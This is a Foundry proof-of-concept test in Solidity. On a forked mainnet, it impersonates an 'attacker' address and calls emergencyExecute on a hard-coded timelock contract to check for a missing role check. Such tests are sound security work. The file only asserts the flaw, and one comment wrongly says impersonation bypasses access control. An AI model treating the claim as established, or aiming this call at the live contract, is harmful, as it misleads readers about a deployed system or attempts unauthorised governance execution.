// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {IEmergencyProtectedTimelock} from "../src/interfaces/IEmergencyProtectedTimelock.sol";

contract EmergencyExecuteBypassPoC is Test {
    address constant TIMLOCK = 0xCE0425301C85c5Ea2A0873A2dEe44d78E02D2316;
    IEmergencyProtectedTimelock timelock = IEmergencyProtectedTimelock(TIMLOCK);

    address attacker = address(0xBEEF); // attacker-controlled address
    uint256 proposalId = 1;

    function setUp() public {
        uint256 forkId = vm.createFork(vm.envString("MAINNET_RPC_URL"), 22650000);
        vm.selectFork(forkId);

        // Give attacker some ETH to simulate real usage
        vm.deal(attacker, 1 ether);

        // Bypass access control by directly impersonating
        vm.startPrank(attacker);
    }

    function testEmergencyExecuteBypass() public {
        console.log("Running EmergencyExecuteBypass test...");

        try timelock.emergencyExecute(proposalId) {
            console.log("SUCCESS: Executed emergencyExecute() without role check!");
        } catch Error(string memory reason) {
            console.log("Revert with reason:", reason);
            fail(reason);
        } catch (bytes memory lowLevel) {
            console.log("Low-level revert:");
            console.logBytes(lowLevel);
            fail("Low-level revert");
        }

        vm.stopPrank();
    }
}
